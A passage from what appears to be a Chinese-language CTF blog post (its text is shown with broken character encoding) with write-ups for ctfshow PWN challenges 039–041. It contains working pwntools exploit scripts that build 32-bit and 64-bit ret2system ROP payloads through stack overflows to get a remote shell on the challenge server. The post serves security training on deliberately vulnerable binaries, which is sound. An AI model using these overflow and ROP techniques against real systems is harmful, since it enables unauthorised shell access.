</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_039">PWN_039
</h3><p>é¢˜ç›®ï¼š32ä½çš„ system(); &ldquo;/bin/sh&rdquo;ã€‚ <a class="link" href="PWN_039" >PWN_039</a></p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/114.png"
	width="750"
	height="210"
	srcset="/p/ctfshow-pwn-writeup/114_hu_ffd0edb80748b701.png 480w, /p/ctfshow-pwn-writeup/114_hu_ed469b05f80e7568.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="357"
		data-flex-basis="857px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°æ²¡å¼€å¯canaryã€PIEä¿æŠ¤çš„ï¼Œå­˜åœ¨å¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´çš„å¯èƒ½ã€‚</p>
<p>IDAï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/115.png"
	width="1000"
	height="450"
	srcset="/p/ctfshow-pwn-writeup/115_hu_e696ee341380586.png 480w, /p/ctfshow-pwn-writeup/115_hu_a20ea7fd6a1243a2.png 1024w"
	loading="lazy"
	
		alt="32ä½çš„IDAåˆ†æ"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="533px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°å‘ç°æ ˆæº¢å‡ºï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/116.png"
	width="596"
	height="140"
	srcset="/p/ctfshow-pwn-writeup/116_hu_1199a62a52d94a2a.png 480w, /p/ctfshow-pwn-writeup/116_hu_d138901c5d88e68e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="425"
		data-flex-basis="1021px"
	
></p>
<p>å¯ä»¥è¯»å–50ä¸ªå­—ç¬¦ç»™bufï¼Œä½†bufå®¹é‡åªæœ‰14ï¼Œæ‰€ä»¥è¶…è¿‡14å°±ä¼šé€ æˆæ ˆæº¢å‡ºã€‚</p>
<p>æ¥ç€åœ¨å‡½æ•°ç›®å½•çœ‹åˆ°hintå‡½æ•°æœ‰çŒ«è…»ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/117.png"
	width="854"
	height="390"
	srcset="/p/ctfshow-pwn-writeup/117_hu_25ebd19a12518947.png 480w, /p/ctfshow-pwn-writeup/117_hu_27e696ef37eed855.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="525px"
	
></p>
<p>é‚£ä¹ˆå¤§è‡´çš„expæ€è·¯å°±æ¥äº†ï¼šä¹Ÿå°±æ˜¯å…ˆcyclicå‡½æ•°ç”Ÿæˆåƒåœ¾å€¼è¦†ç›–å±€éƒ¨å˜é‡å’Œebpå¯„å­˜å™¨æœ¬èº«ï¼›ä½†æ˜¯åªæœ‰systemå‡½æ•°å’Œ/bin/shï¼Œå´æ²¡æœ‰system(â€œ/bin/shâ€);çš„åé—¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æ„é€ å‡ºæ¥ã€‚</p>
<p>åœ¨ç¼–å†™expæ—¶ï¼Œå› ä¸ºç¨‹åºæ˜¯32ä½ï¼Œæ‰€ä»¥è¯´ä¸ç”¨å»è€ƒè™‘å®ƒçš„å †æ ˆå¹³è¡¡ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28216</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x8048750</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„p32(0)ç­‰äº4å­—èŠ‚ï¼Œå¯ä»¥ç”¨å››ä¸ªaæˆ–è€…cyclic(4)ä»£æ›¿ä¹Ÿè¡Œï¼Œè¿™æ—¶32ä½ä¸‹systemå‡½æ•°çš„è¿”å›åœ°å€å ä½ç¬¦ï¼Œç„¶åå°±åˆ°æ‰§è¡Œ/bin/shï¼Œé‚£å°±æ˜¯è·³è½¬åˆ°å®ƒçš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/118.png"
	width="1155"
	height="119"
	srcset="/p/ctfshow-pwn-writeup/118_hu_e5e93807f34b7bdd.png 480w, /p/ctfshow-pwn-writeup/118_hu_875bb0d0ab4ca27d.png 1024w"
	loading="lazy"
	
		alt="/bin/shå­—ç¬¦ä¸²çš„åœ°å€"
	
	
		class="gallery-image" 
		data-flex-grow="970"
		data-flex-basis="2329px"
	
></p>
<p>è¿™æ ·å­æˆ‘ä»¬å°±æ„é€ å‡ºsystem(&quot;/bin/sh&quot;);äº†ï¼Œç„¶åè¿›å…¥äº¤äº’æ¨¡å¼è·å¾—flagã€‚</p>
<p>è¿™é¢˜ä¸»è¦è€ƒå¯Ÿæˆ‘ä»¬å¯¹äºå‡½æ•°çš„æ„é€ ä»¥åŠå‡½æ•°åœ°å€çš„æ‹¼æ¥ã€æ ˆçš„ç»“æ„ç»„æˆã€‚éœ€è¦å¤šçœ‹çœ‹æˆ‘çš„PWN-2å•Šã€‚ã€‚ã€‚ã€‚</p>
<h3 id="pwn_040">PWN_040
</h3><p>é¢˜ç›®ï¼š64ä½çš„ system(); &ldquo;/bin/sh&rdquo;ã€‚</p>
<p>IDA64ä½åˆ†æï¼Œè·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/119.png"
	width="551"
	height="149"
	srcset="/p/ctfshow-pwn-writeup/119_hu_4361ba4a461d934e.png 480w, /p/ctfshow-pwn-writeup/119_hu_d335e677bd05e71e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="369"
		data-flex-basis="887px"
	
></p>
<p>checksecçœ‹åˆ°æœªæ‰“å¼€canaryä¿æŠ¤ï¼Œè€Œä¸”åœ¨ctfshowå‡½æ•°è¿™å‘ç°æœ‰æ ˆæº¢å‡ºã€‚</p>
<p>è·Ÿè¿›hintå‡½æ•°ï¼Œå‘ç°åé—¨ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/120.png"
	width="540"
	height="125"
	srcset="/p/ctfshow-pwn-writeup/120_hu_ac0e24a915fef2c8.png 480w, /p/ctfshow-pwn-writeup/120_hu_a859f06ba4c0b768.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="432"
		data-flex-basis="1036px"
	
></p>
<p>ç”¨ROPgadgetå‘½ä»¤æŸ¥è¯¢retåœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/121.png"
	width="1224"
	height="450"
	srcset="/p/ctfshow-pwn-writeup/121_hu_749e2c86a93f982a.png 480w, /p/ctfshow-pwn-writeup/121_hu_9f8cdc6270b0312a.png 1024w"
	loading="lazy"
	
		alt="retåœ°å€æŸ¥è¯¢"
	
	
		class="gallery-image" 
		data-flex-grow="272"
		data-flex-basis="652px"
	
></p>
<p>æŸ¥è¯¢/bin/shçš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/122.png"
	width="1135"
	height="105"
	srcset="/p/ctfshow-pwn-writeup/122_hu_8e4f1859de6b1d4c.png 480w, /p/ctfshow-pwn-writeup/122_hu_772a3258af0a8472.png 1024w"
	loading="lazy"
	
		alt="/bin/shçš„åœ°å€ï¼š0x400808"
	
	
		class="gallery-image" 
		data-flex-grow="1080"
		data-flex-basis="2594px"
	
></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28194</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x400808</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4007e3</span> <span class="c1"># 0x00000000004007e3 : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x4004fe</span> <span class="c1"># 0x00000000004004fe : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¬¸ä¸ºä»€ä¹ˆexpçš„payloadä¸­çš„å‚æ•°ä¸å¤ªä¸€æ ·ï¼Ÿ</p>
<blockquote class="alert alert-note">
    <blockquote>
<h3 id="32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº"><strong>32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº</strong>
</h3><p>å³ä½¿æ€è·¯ä¸€æ ·ä½†æ¶æ„ä¸ä¸€æ ·ï¼Œåœ¨å†™payloadçš„æ—¶å€™æ³¨å…¥åœ°å€çš„é¡ºåºä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼š</p>
<ul>
<li><strong>32 ä½ç¨‹åºï¼ˆPWN039ï¼‰</strong>ï¼š32 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°å‚æ•°é€šè¿‡æ ˆä¼ é€’ã€‚åœ¨ PWN039 é‡Œï¼Œ<code>system</code>å‡½æ•°åœ°å€ç´§è·Ÿåœ¨å¡«å……æ•°æ®ä¹‹åï¼Œè¿™æ˜¯å› ä¸ºæº¢å‡ºåç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸º<code>system</code>å‡½æ•°åœ°å€ï¼Œè®©ç¨‹åºæ‰§è¡Œ<code>system</code>å‡½æ•°ã€‚åœ¨<code>payload = 'a'*(0x12 + 4) + p32(system) + p32(0) + p32(bin_sh)</code>ä¸­ï¼Œ<code>'a'*(0x12 + 4)</code>ç”¨äºå¡«å……ç¼“å†²åŒºå¹¶è¦†ç›–åŸè¿”å›åœ°å€ï¼Œ<code>p32(system)</code>å°†è¿”å›åœ°å€ä¿®æ”¹ä¸º<code>system</code>å‡½æ•°åœ°å€ ï¼Œ<code>p32(0)</code>æ˜¯ä¸ºäº†æ»¡è¶³æ ˆç»“æ„ï¼Œä½œä¸º<code>system</code>å‡½æ•°æ‰§è¡Œåçš„è¿”å›åœ°å€ï¼ˆå®é™…æ‰§è¡Œä¸­å¹¶ä¸é‡è¦ï¼Œå¯éšæ„å¡«å…… 4 å­—èŠ‚ï¼‰ï¼Œ<code>p32(bin_sh)</code>åˆ™æ˜¯<code>system</code>å‡½æ•°çš„å‚æ•°ï¼Œå³<code>/bin/sh</code>å­—ç¬¦ä¸²çš„åœ°å€ã€‚è¿™æ ·çš„é¡ºåºç¬¦åˆ 32 ä½ç¨‹åºé€šè¿‡æ ˆä¼ å‚å’Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„ç‰¹ç‚¹ã€‚</li>
<li><strong>64 ä½ç¨‹åºï¼ˆPWN40ï¼‰</strong>ï¼š64 ä½ç¨‹åºçš„å‡½æ•°è°ƒç”¨è§„åˆ™æœ‰æ‰€ä¸åŒï¼Œå‰ 6 ä¸ªå‚æ•°ä¼˜å…ˆé€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°å­˜æ”¾åœ¨<code>rdi</code>å¯„å­˜å™¨ã€‚åœ¨ PWN40 ä¸­ï¼Œ<code>payload = 'a'*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</code> ï¼Œ<code>'a'*(0xA + 8)</code>ç”¨äºå¡«å……ç¼“å†²åŒºå’Œè¦†ç›–åŸè¿”å›åœ°å€ï¼›<code>p64(pop_rdi)</code>å°†<code>pop_rdi</code>æŒ‡ä»¤åœ°å€æ”¾å…¥æ ˆä¸­ï¼Œæ‰§è¡Œ<code>pop_rdi</code>æŒ‡ä»¤æ—¶ï¼Œä¼šæŠŠç´§è·Ÿå…¶åçš„<code>p64(bin_sh)</code>ä¸­çš„<code>/bin/sh</code>åœ°å€å¼¹å‡ºåˆ°<code>rdi</code>å¯„å­˜å™¨ï¼Œä½œä¸º<code>system</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼›<code>p64(ret)</code>ç”¨äºæ ˆå¯¹é½ï¼ˆ64 ä½ç¨‹åºè°ƒç”¨å‡½æ•°å‰éœ€è¦ä¿è¯æ ˆ 16 å­—èŠ‚å¯¹é½ï¼Œ<code>ret</code>æŒ‡ä»¤å¯è°ƒæ•´æ ˆæŒ‡é’ˆï¼‰ï¼›æœ€å<code>p64(system)</code>å°†<code>system</code>å‡½æ•°åœ°å€æ”¾å…¥æ ˆä¸­ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œä¼šè·³è½¬åˆ°<code>system</code>å‡½æ•°æ‰§è¡Œï¼Œæ­¤æ—¶<code>rdi</code>å¯„å­˜å™¨ä¸­å·²æ­£ç¡®è®¾ç½®äº†å‚æ•°<code>/bin/sh</code>çš„åœ°å€ã€‚</li>
</ul></blockquote></blockquote>
<h3 id="pwn_041">PWN_041
</h3><p>é¢˜ç›®ï¼š32ä½çš„ system(); ä½†æ˜¯æ²¡&quot;/bin/sh&quot; ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£ã€‚ <a class="link" href="PWN_041" >PWN_041</a></p>

</section>


    <footer class="article-footer">
    

    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            æœ€åæ›´æ–°äº 2025-09-02
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
	const mainArticleElement = document.querySelector(".main-article");
        renderMathInElement(mainArticleElement, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>

    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/pwn-3/">
        
        
            <div class="article-image">
                <img src="/p/pwn-3/PWN3.4afa5f5bde601dbc35b64aebcb8c25e3_hu_a61ad70f238c03c4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-3"
                        
                        data-hash="md5-SvpfW95gHbw1tkrry4wl4w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-3</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-2/">
        
        
            <div class="article-image">
                <img src="/p/pwn-2/PWN2.ec0b8de7542727a390b799ae24c64af8_hu_ed10e985448522e2.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-2"
                        
                        data-hash="md5-7AuN51QnJ6OQt5muJMZK&#43;A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-2</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-1/">
        
        
            <div class="article-image">
                <img src="/p/pwn-1/PWN.f98719505e350e475520e79f81d73a1d_hu_fb4f51a67c6d3b57.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-1"
                        
                        data-hash="md5-&#43;YcZUF41DkdVIOefgdc6HQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-1</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/misc/">
        
        

        <div class="article-details">
            <h2 class="article-title">MISC</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/">
        
        
            <div class="article-image">
                <img src="/p/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E5%B0%81%E9%9D%A2.5d92b0f978b2a3d5f8f5c87b90b35a11_hu_a3be8ec01e92cdbf.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ç¬¬ä¸€é˜¶æ®µ"
                        data-key="ç½‘å®‰å­¦ä¹ ç¬¬ä¸€é˜¶æ®µ" 
                        data-hash="md5-XZKw&#43;Xiyo9X49ch7kLNaEQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç¬¬ä¸€é˜¶æ®µ</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
    data-repo-id="R_kgDOPd0X7g"
    data-category="Announcements"
    data-category-id="DIC_kwDOPd0X7s4CuMr6"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading=""
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark');
            }
        }
    })();
</script>

    

    
<script defer src="https://events.vercount.one/js"></script>
<footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Expl0rer.Ct
    </section>
    
    <section class="powerby">
        



        























        
<section class="wordcount">
  <div class="wordcount-row">
    <p>åšä¸»å‘å¸ƒäº†7ç¯‡æ–‡ç«   ||</p>
    <p>æ€»å…±91.17k å­—</p>
  </div>
</section>
        
  


<a>æ€»è®¿å®¢æ•°: </a><span id='busuanzi_value_site_uv'>åˆ«æ€¥åœ¨åŠ è½½ä¸­äº†...</span> <a> | </a> <a>æ€»è®¿é—®é‡: </a><span id='busuanzi_value_site_pv'>åŠ è½½ä¸­...</span></br>



<div class="site-uptime-container">
  <span id="timeDate" class="site-uptime-text">è½½å…¥å¤©æ•°...</span>
  <span id="times" class="site-uptime-text">è½½å…¥æ—¶åˆ†ç§’...</span>
</div>

<script language="javascript"> 
    var now = new Date();
    function createtime(){
        now.setTime(now.getTime()+250); 
        var grt= new Date("2025/08/01 00:00:00"); 
        days = (now - grt ) / 1000 / 60 / 60 / 24;
        dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
        hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes);
        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds);
        if(String(snum).length ==1 ){snum = "0" + snum;}

        document.getElementById("timeDate").innerHTML = "æœ¬ç«™å·²ç¨³å®šè¿è¡Œ"+dnum+" å¤© ";document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"
    }
    setInterval("createtime()",250); 
</script> 

<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


<head>
  
  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
  <link 
    href="https://fonts.font.im/css?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-cn"
  >
  
  
  <link 
    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-en"
    disabled
  >
  
  <script>
    
    document.querySelector('#font-cn').addEventListener('load', function() {
      document.querySelector('#font-en').disabled = true;
    }).addEventListener('error', function() {
      document.querySelector('#font-en').disabled = false;
      document.querySelector('#font-en').media = 'all';
    });
  </script>
  
  <noscript>
    <link 
      href="https://fonts.font.im/css?family=PT+Sans" 
      rel="stylesheet"
    >
  </noscript>
</head>

<style>
    #TableOfContents > ul ul,
